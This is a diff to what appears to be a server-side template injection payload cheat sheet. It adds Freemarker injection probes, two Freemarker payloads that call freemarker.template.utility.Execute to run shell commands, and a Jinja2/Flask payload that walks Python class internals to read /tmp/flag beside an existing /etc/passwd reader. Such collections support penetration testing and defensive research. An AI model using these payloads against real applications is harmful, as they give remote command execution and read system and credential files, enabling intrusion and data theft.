@@ -20,6 +20,8 @@
   * [Code execution](#code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
+  * [Basic injection](#basic-injection)
+  * [Code execution](#code-execution)
 * [Jade / Codepen](#jade---codepen)
 * [Velocity](#velocity)
 * [Mako](#mako)
@@ -137,11 +139,17 @@ $output = $twig > render (
 
 ## Freemarker
 
-Default functionality.
+You can try your payloads at [https://try.freemarker.apache.org](https://try.freemarker.apache.org)
 
-```python
-<#assign
-ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+### Basic injection
+
+The template can be `${3*3}` or the legacy `#{3*3}`
+
+### Code execution
+
+```js
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
+[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ```
 
 ## Jade / Codepen
@@ -228,6 +236,7 @@ The above injections have been tested on Flask application.
 ```python
 # ''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
 ```
 
 ### Write into remote file
